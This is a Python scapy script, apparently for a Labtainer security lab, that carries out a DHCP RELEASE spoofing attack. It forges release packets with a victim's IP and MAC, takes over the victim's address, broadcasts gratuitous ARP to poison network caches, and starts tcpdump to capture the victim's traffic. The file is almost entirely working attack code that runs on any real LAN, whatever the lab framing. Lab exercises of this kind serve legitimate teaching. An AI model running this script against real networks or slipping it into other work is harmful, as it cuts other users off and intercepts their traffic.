#!/usr/bin/env python3
"""DHCP RELEASE spoofing exercise for the isolated Labtainer environment."""

import sys
import os
import time
import random
import subprocess
from scapy.all import *

RESULT_LOGS = ["/var/log/attack.log", "/home/ubuntu/.local/result/attack.log"]
TRAFFIC_LOG = "/var/log/traffic.log"

def log_event(filenames, msg):
    if isinstance(filenames, str):
        filenames = [filenames]
    for filename in filenames:
        try:
            os.makedirs(os.path.dirname(filename), exist_ok=True)
            with open(filename, "a") as f:
                f.write(msg + "\n")
            os.system(f"chmod 666 {filename} 2>/dev/null")
        except:
            pass

def get_current_ip(iface):
    try:
        out = subprocess.check_output(f"ip -4 addr show {iface}", shell=True).decode()
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return None

def get_required_input(prompt_text):
    while True:
        value = input(prompt_text).strip()
        if value:
            return value
        print("[WARN] Input cannot be empty. Please enter a value.")

def send_spoofed_release(iface, server_ip, victim_ip, victim_mac):
    mac_bytes = bytes.fromhex(victim_mac.replace(":", ""))
    xid = random.randint(1, 999999)
    gw_ip = "10.10.0.1"
    gw_mac = getmacbyip(gw_ip) or "02:42:0a:0a:00:01"

    release_pkt = (
        Ether(dst=gw_mac, src=victim_mac) /
        IP(src=victim_ip, dst=server_ip) /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac_bytes, ciaddr=victim_ip, xid=xid) /
        DHCP(options=[
            ("message-type", "release"),
            ("server_id", server_ip),
            ("client_id", b"\x01" + mac_bytes),
            "end"
        ])
    )
    sendp(release_pkt, iface=iface, count=3, inter=0.1, verbose=0)
    print(f"[OK] DHCPRELEASE packets sent for {victim_ip} via {gw_ip}.")

def main():
    print("=== DHCP RELEASE Spoofing Lab ===")

    iface = get_required_input("Enter network interface (e.g., eth0): ")
    server_ip = get_required_input("Enter DHCP Server IP address (e.g., 192.168.0.10): ")
    victim_ip = get_required_input("Enter Victim Client IP address (e.g., 10.10.0.10): ")
    victim_mac = get_required_input("Enter Victim Client MAC address (e.g., 01:23:45:67:89:ab): ")

    print("\n[STEP 1] Release the attacker's current lease")
    attacker_old_ip = get_current_ip(iface)
    if attacker_old_ip:
        print(f"[INFO] Current address: {attacker_old_ip}. Requesting lease release.")
        os.system(f"dhclient -r {iface} 2>/dev/null")
        os.system(f"ip -4 addr flush dev {iface} 2>/dev/null")
        time.sleep(1)
        print(f"[INFO] Release commands completed for {attacker_old_ip}; verify interface state separately.")
    else:
        print("[INFO] No current IPv4 address found; continuing.")

    print("\n[STEP 2] Send the DHCPRELEASE exercise packet")
    send_spoofed_release(iface, server_ip, victim_ip, victim_mac)
    time.sleep(1)

    print("\n[STEP 3] Attempt local address configuration")
    os.system(f"ip addr add {victim_ip}/24 dev {iface}")
    os.system(f"ip link set {iface} up")
    os.system(f"ip route add default via 10.10.0.1 dev {iface} 2>/dev/null")

    # Broadcast Gratuitous ARP to update ARP caches in the entire network
    attacker_mac = get_if_hwaddr(iface)
    arp_pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker_mac) / ARP(
        op=2, hwsrc=attacker_mac, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=victim_ip
    )
    sendp(arp_pkt, iface=iface, count=3, verbose=0)
    print(f"[OK] Local address configuration requested for {victim_ip} on {iface}.")
    print("[OK] Gratuitous ARP sent.")

    log_event(RESULT_LOGS, f"HIJACK_ATTEMPTED: IP={victim_ip} MAC={attacker_mac}")

    capture_filter = (
        f"icmp and src host {server_ip} and dst host {victim_ip} "
        "and icmp[icmptype] = icmp-echo"
    )
    try:
        with open(TRAFFIC_LOG, "w") as traffic_log:
            subprocess.Popen(
                ["tcpdump", "-i", iface, "-n", "-l", capture_filter],
                stdout=traffic_log,
                stderr=subprocess.STDOUT,
                start_new_session=True,
            )
    except OSError as error:
        print(f"[WARN] Could not start the traffic capture: {error}")


if __name__ == "__main__":
    main()
